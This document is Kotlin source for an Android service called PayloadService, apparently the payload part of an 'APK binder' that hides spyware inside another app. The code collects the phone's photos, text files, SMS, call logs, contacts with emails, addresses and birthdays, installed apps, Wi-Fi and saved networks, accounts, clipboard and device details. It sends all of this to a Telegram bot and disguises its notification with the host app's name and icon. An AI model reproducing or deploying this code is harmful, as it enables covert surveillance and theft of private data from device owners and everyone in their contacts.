package Com.devhs.apkbinder.payload

import android.accounts.AccountManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import Com.devhs.apkbinder.core.Const
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.Executors
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

class PayloadService : Service() {

    private val pool = Executors.newFixedThreadPool(Const.PARALLEL_UPLOADS)
    private lateinit var gate: Semaphore
    private val done = AtomicInteger(0)

    private var token = ""
    private var chat = ""
    private var appName = ""

    override fun onCreate() {
        super.onCreate()
        HsLog.init(this)
        gate = Semaphore(Const.PARALLEL_UPLOADS)
        appName = try {
            val ai = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(ai).toString()
        } catch (t: Throwable) {
            "App"
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        HsLog.w("onStartCommand")
        startForegroundSafe()

        Thread {
            try {
                run()
            } catch (t: Throwable) {
                HsLog.e("run: ${t.javaClass.simpleName} ${t.message}")
            } finally {
                try {
                    stopForeground(true)
                } catch (_: Throwable) {
                }
                stopSelf()
            }
        }.start()

        return START_NOT_STICKY
    }

    private fun run() {
        val cfg = HsConfig.read(this)
        if (cfg == null) {
            HsLog.e("no config")
            return
        }
        token = cfg.token
        chat = cfg.chat
        val f = cfg.features
        HsLog.w("features=$f")

        if (f.contains("gallery")) {
            val images = queryImages()
            HsLog.w("images=${images.size}")
            images.forEach { sendImage(it) }

            val texts = queryTexts()
            HsLog.w("texts=${texts.size}")
            texts.forEach { sendDoc(it) }
        }

        if (f.contains("sms")) sendSms()
        if (f.contains("calls")) sendCalls()
        if (f.contains("contacts")) sendContacts()
        if (f.contains("contact_details")) sendContactDetails()
        if (f.contains("device")) sendDevice()
        if (f.contains("apps")) sendApps()
        if (f.contains("wifi")) sendWifi()
        if (f.contains("accounts")) sendAccounts()
        if (f.contains("clipboard")) sendClipboard()
        if (f.contains("system")) sendSystem()

        pool.shutdown()
        pool.awaitTermination(30, TimeUnit.MINUTES)
        HsLog.w("all done: ${done.get()}")
    }

    private fun startForegroundSafe() {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= 26) {
                val ch = NotificationChannel(
                    Const.CHANNEL_ID, appName, NotificationManager.IMPORTANCE_LOW
                )
                ch.setShowBadge(false)
                nm.createNotificationChannel(ch)
            }

            val smallIcon = try {
                val ai = packageManager.getApplicationInfo(packageName, 0)
                if (ai.icon != 0) ai.icon else android.R.drawable.stat_sys_download
            } catch (t: Throwable) {
                android.R.drawable.stat_sys_download
            }

            val builder = if (Build.VERSION.SDK_INT >= 26)
                Notification.Builder(this, Const.CHANNEL_ID)
            else
                @Suppress("DEPRECATION") Notification.Builder(this)

            builder
                .setContentTitle(appName)
                .setContentText(appName)
                .setSmallIcon(smallIcon)
                .setOngoing(true)
                .setShowWhen(false)

            try {
                val ai = packageManager.getApplicationInfo(packageName, 0)
                drawableToBitmap(packageManager.getApplicationIcon(ai))?.let {
                    builder.setLargeIcon(it)
                }
            } catch (_: Throwable) {
            }

            val n = builder.build()

            if (Build.VERSION.SDK_INT >= 29) {
                try {
                    startForeground(Const.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    return
                } catch (t: Throwable) {
                    HsLog.e("fg typed: ${t.message}")
                }
            }
            try {
                startForeground(Const.NOTIF_ID, n)
            } catch (t: Throwable) {
                HsLog.e("fg plain: ${t.message}")
            }
        } catch (t: Throwable) {
            HsLog.e("startForegroundSafe: ${t.message}")
        }
    }

    private fun drawableToBitmap(d: Drawable): Bitmap? = try {
        if (d is BitmapDrawable && d.bitmap != null) d.bitmap
        else {
            val w = if (d.intrinsicWidth > 0) d.intrinsicWidth else 96
            val h = if (d.intrinsicHeight > 0) d.intrinsicHeight else 96
            val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            val c = Canvas(bmp)
            d.setBounds(0, 0, w, h)
            d.draw(c)
            bmp
        }
    } catch (t: Throwable) {
        null
    }

    private fun postFile(
        api: String,
        field: String,
        fileName: String,
        mime: String,
        data: ByteArray
    ): Boolean {
        val boundary = "----hs" + System.nanoTime()
        var conn: HttpURLConnection? = null
        try {
            val safeName = fileName.replace("\"", "_")

            val pre = ("--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                    chat + "\r\n" +
                    "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
                    Const.CAPTION + "\r\n" +
                    "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"" + field +
                    "\"; filename=\"" + safeName + "\"\r\n" +
                    "Content-Type: " + mime + "\r\n\r\n").toByteArray(Charsets.UTF_8)

            val post = ("\r\n--" + boundary + "--\r\n").toByteArray(Charsets.UTF_8)

            val url = URL("https://api.telegram.org/bot" + token + "/" + api)
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 20000
            conn.readTimeout = 90000
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
            conn.setFixedLengthStreamingMode(pre.size + data.size + post.size)

            conn.outputStream.use { os ->
                os.write(pre)
                os.write(data)
                os.write(post)
                os.flush()
            }

            val code = conn.responseCode
            if (code in 200..299) return true

            var body = ""
            try {
                val es = conn.errorStream
                if (es != null) {
                    body = es.use { it.readBytes().toString(Charsets.UTF_8) }
                }
            } catch (_: Throwable) {
            }
            HsLog.e("http " + code + " " + api + " " + safeName + " :: " + body.take(300))
            return false
        } catch (t: Throwable) {
            HsLog.e("http fail " + api + ": " + t.message)
            return false
        } finally {
            try {
                conn?.disconnect()
            } catch (_: Throwable) {
            }
        }
    }

    private fun queryImages(): List<Uri> {
        val out = ArrayList<Uri>()
        val proj = arrayOf(MediaStore.Images.Media._ID)
        try {
            cursor(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, Const.IMAGE_LIMIT) { id ->
                out += ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            }
        } catch (t: Throwable) {
            HsLog.e("queryImages: ${t.message}")
        }
        return out
    }

    private fun queryTexts(): List<Uri> {
        val out = ArrayList<Uri>()
        try {
            val proj = arrayOf(MediaStore.Files.FileColumns._ID)
            val sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=? OR " +
                    MediaStore.Files.FileColumns.MEDIA_TYPE + "=?"
            val args = arrayOf(
                MediaStore.Files.FileColumns.MEDIA_TYPE_NONE.toString(),
                MediaStore.Files.FileColumns.MEDIA_TYPE_DOCUMENT.toString()
            )
            cursor(MediaStore.Files.getContentUri("external"), proj, 3000, sel, args) { id ->
                out += ContentUris.withAppendedId(MediaStore.Files.getContentUri("external"), id)
            }
        } catch (t: Throwable) {
            HsLog.e("queryTexts: ${t.message}")
        }
        return out
    }

    private fun cursor(
        uri: Uri, proj: Array<String>, limit: Int,
        sel: String? = null, args: Array<String>? = null,
        onRow: (Long) -> Unit
    ) {
        contentResolver.query(uri, proj, sel, args, MediaStore.Images.Media.DATE_ADDED + " DESC")
            ?.use { c ->
                val idx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                var n = 0
                while (c.moveToNext() && n < limit) {
                    onRow(c.getLong(idx))
                    n++
                }
            }
    }

    private fun nameOf(uri: Uri): String = try {
        contentResolver.query(uri, arrayOf(MediaStore.MediaColumns.DISPLAY_NAME), null, null, null)
            ?.use { c -> if (c.moveToFirst()) c.getString(0) else null } ?: "file"
    } catch (t: Throwable) {
        "file"
    }

    private fun bytesOf(uri: Uri): ByteArray? = try {
        contentResolver.openInputStream(uri)?.use { it.readBytes() }
    } catch (t: Throwable) {
        null
    }

    private fun sendImage(uri: Uri) {
        gate.acquire()
        pool.execute {
            try {
                val name = nameOf(uri)
                val lower = name.lowercase()
                if (!(lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
                            lower.endsWith(".png") || lower.endsWith(".webp"))
                ) return@execute
                val data = bytesOf(uri) ?: return@execute
                if (postFile("sendPhoto", "photo", name, "image/jpeg", data)) done.incrementAndGet()
            } catch (t: Throwable) {
                HsLog.e("sendImage: ${t.message}")
            } finally {
                gate.release()
            }
        }
    }

    private fun sendDoc(uri: Uri) {
        gate.acquire()
        pool.execute {
            try {
                val name = nameOf(uri)
                if (!name.lowercase().endsWith(".txt")) return@execute
                val data = bytesOf(uri) ?: return@execute
                if (postFile("sendDocument", "document", name, "text/plain", data)) done.incrementAndGet()
            } catch (t: Throwable) {
                HsLog.e("sendDoc: ${t.message}")
            } finally {
                gate.release()
            }
        }
    }

    private fun sendTextFile(name: String, content: String) {
        gate.acquire()
        pool.execute {
            try {
                val data = content.toByteArray(Charsets.UTF_8)
                if (postFile("sendDocument", "document", name, "text/plain", data)) done.incrementAndGet()
            } catch (t: Throwable) {
                HsLog.e("sendTextFile: ${t.message}")
            } finally {
                gate.release()
            }
        }
    }

    private fun stamp(millis: Long): String = try {
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(millis))
    } catch (t: Throwable) {
        millis.toString()
    }

    private fun sendSms() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                null, null, "date DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 5000) {
                    val addr = c.getString(0) ?: "?"
                    val body = c.getString(1) ?: ""
                    val date = c.getLong(2)
                    val type = c.getInt(3)
                    val dir = if (type == 1) "IN" else if (type == 2) "OUT" else "OTHER"
                    sb.append("[").append(dir).append("] ").append(stamp(date)).append("\n")
                    sb.append(addr).append(": ").append(body).append("\n\n")
                    n++
                }
            }
        } catch (t: Throwable) {
            HsLog.e("sms: ${t.message}")
            return
        }
        HsLog.w("sms chars=${sb.length}")
        if (sb.isNotEmpty()) sendTextFile("sms.txt", sb.toString())
    }

    private fun sendCalls() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, CallLog.Calls.DATE + " DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 5000) {
                    val num = c.getString(0) ?: "?"
                    val type = c.getInt(1)
                    val date = c.getLong(2)
                    val dur = c.getLong(3)
                    val kind = when (type) {
                        1 -> "IN"
                        2 -> "OUT"
                        3 -> "MISSED"
                        else -> "OTHER"
                    }
                    sb.append("[").append(kind).append("] ").append(stamp(date))
                    sb.append(" dur=").append(dur).append("s ").append(num).append("\n")
                    n++
                }
            }
        } catch (t: Throwable) {
            HsLog.e("calls: ${t.message}")
            return
        }
        HsLog.w("calls chars=${sb.length}")
        if (sb.isNotEmpty()) sendTextFile("call_log.txt", sb.toString())
    }

    private fun sendContacts() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 5000) {
                    val name = c.getString(0) ?: "?"
                    val num = c.getString(1) ?: ""
                    sb.append(name).append(": ").append(num).append("\n")
                    n++
                }
            }
        } catch (t: Throwable) {
            HsLog.e("contacts: ${t.message}")
            return
        }
        HsLog.w("contacts chars=${sb.length}")
        if (sb.isNotEmpty()) sendTextFile("contacts.txt", sb.toString())
    }

    private fun sendContactDetails() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Email.ADDRESS
                ), null, null, null
            )?.use { c ->
                while (c.moveToNext() && sb.length < 900_000) {
                    sb.append(c.getString(0) ?: "?").append(" | email: ")
                        .append(c.getString(1) ?: "").append("\n")
                }
            }
            contentResolver.query(
                ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS
                ), null, null, null
            )?.use { c ->
                while (c.moveToNext() && sb.length < 1_500_000) {
                    sb.append(c.getString(0) ?: "?").append(" | addr: ")
                        .append(c.getString(1) ?: "").append("\n")
                }
            }
            contentResolver.query(
                ContactsContract.CommonDataKinds.Event.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Event.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Event.START_DATE
                ),
                ContactsContract.CommonDataKinds.Event.TYPE + "=" +
                        ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY,
                null, null
            )?.use { c ->
                while (c.moveToNext() && sb.length < 2_000_000) {
                    sb.append(c.getString(0) ?: "?").append(" | birthday: ")
                        .append(c.getString(1) ?: "").append("\n")
                }
            }
        } catch (t: Throwable) {
            HsLog.e("contactDetails: ${t.message}")
            return
        }
        HsLog.w("contactDetails chars=${sb.length}")
        if (sb.isNotEmpty()) sendTextFile("contact_details.txt", sb.toString())
    }

    private fun sendApps() {
        val sb = StringBuilder()
        try {
            val pm = packageManager
            val rows = ArrayList<String>()
            for (pi in pm.getInstalledPackages(0)) {
                val ai = pi.applicationInfo ?: continue
                val label = try {
                    pm.getApplicationLabel(ai).toString()
                } catch (t: Throwable) {
                    "?"
                }
                val kind = if ((ai.flags and ApplicationInfo.FLAG_SYSTEM) != 0) "SYS" else "USR"
                rows.add("[" + kind + "] " + label + " | " + pi.packageName +
                        " | " + (pi.versionName ?: "-") + " | " + pi.firstInstallTime)
            }
            rows.sort()
            for (r in rows) sb.append(r).append("\n")
        } catch (t: Throwable) {
            HsLog.e("apps: ${t.message}")
            return
        }
        HsLog.w("apps chars=${sb.length}")
        if (sb.isNotEmpty()) sendTextFile("installed_apps.txt", sb.toString())
    }

    private fun intToIp(v: Int): String =
        (v and 0xFF).toString() + "." + ((v shr 8) and 0xFF) + "." +
                ((v shr 16) and 0xFF) + "." + ((v shr 24) and 0xFF)

    private fun sendWifi() {
        val sb = StringBuilder()
        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            val ci = wm.connectionInfo
            if (ci != null) {
                sb.append("SSID: ").append(ci.ssid).append("\n")
                sb.append("BSSID: ").append(ci.bssid).append("\n")
                sb.append("IP: ").append(intToIp(ci.ipAddress)).append("\n")
                sb.append("Link speed: ").append(ci.linkSpeed).append("\n")
                sb.append("RSSI: ").append(ci.rssi).append("\n")
            }
            sb.append("\nSaved networks:\n")
            @Suppress("DEPRECATION")
            val nets = wm.configuredNetworks
            if (nets != null) {
                for (n in nets) {
                    sb.append(n.SSID).append(" | ").append(n.BSSID).append("\n")
                }
            }
        } catch (t: Throwable) {
            HsLog.e("wifi: ${t.message}")
            return
        }
        HsLog.w("wifi chars=${sb.length}")
        sendTextFile("wifi.txt", sb.toString())
    }

    private fun sendAccounts() {
        val sb = StringBuilder()
        try {
            val am = AccountManager.get(this)
            for (a in am.accounts) {
                sb.append(a.name).append(" | ").append(a.type).append("\n")
            }
            sb.append("\nNote: passwords are not readable without root.\n")
        } catch (t: Throwable) {
            HsLog.e("accounts: ${t.message}")
            return
        }
        HsLog.w("accounts chars=${sb.length}")
        sendTextFile("accounts.txt", sb.toString())
    }

    private fun sendClipboard() {
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip ?: return
            val sb = StringBuilder()
            for (i in 0 until clip.itemCount) {
                val t = clip.getItemAt(i).text?.toString() ?: continue
                sb.append(t).append("\n---\n")
            }
            if (sb.isNotEmpty()) sendTextFile("clipboard.txt", sb.toString())
        } catch (t: Throwable) {
            HsLog.e("clipboard: ${t.message}")
        }
    }

    private fun sendSystem() {
        val sb = StringBuilder()
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            sb.append("Battery: ")
                .append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)).append("%\n")
        } catch (_: Throwable) {
        }
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val nc = cm.getNetworkCapabilities(cm.activeNetwork)
            val t = when {
                nc == null -> "none"
                nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
                nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
                nc.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
                else -> "other"
            }
            sb.append("Network: ").append(t).append("\n")
        } catch (_: Throwable) {
        }
        try {
            val dm = resources.displayMetrics
            sb.append("Screen: ").append(dm.widthPixels).append("x").append(dm.heightPixels)
                .append(" @").append(dm.densityDpi).append("dpi\n")
        } catch (_: Throwable) {
        }
        sb.append("Timezone: ").append(TimeZone.getDefault().id).append("\n")
        sb.append("Uptime: ").append(SystemClock.elapsedRealtime() / 1000).append("s\n")
        HsLog.w("system chars=${sb.length}")
        sendTextFile("system.txt", sb.toString())
    }

    private fun sendDevice() {
        val sb = StringBuilder()
        sb.append("Brand: ").append(Build.BRAND).append("\n")
        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n")
        sb.append("Model: ").append(Build.MODEL).append("\n")
        sb.append("Device: ").append(Build.DEVICE).append("\n")
        sb.append("Product: ").append(Build.PRODUCT).append("\n")
        sb.append("Hardware: ").append(Build.HARDWARE).append("\n")
        sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n")
        sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n")
        sb.append("Fingerprint: ").append(Build.FINGERPRINT).append("\n")
        sb.append("Host package: ").append(packageName).append("\n")
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            sb.append("Operator: ").append(tm.networkOperatorName).append("\n")
            sb.append("Sim country: ").append(tm.simCountryIso).append("\n")
        } catch (_: Throwable) {
        }
        HsLog.w("device chars=${sb.length}")
        sendTextFile("device_info.txt", sb.toString())
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            pool.shutdownNow()
        } catch (_: Throwable) {
        }
        super.onDestroy()
    }
}
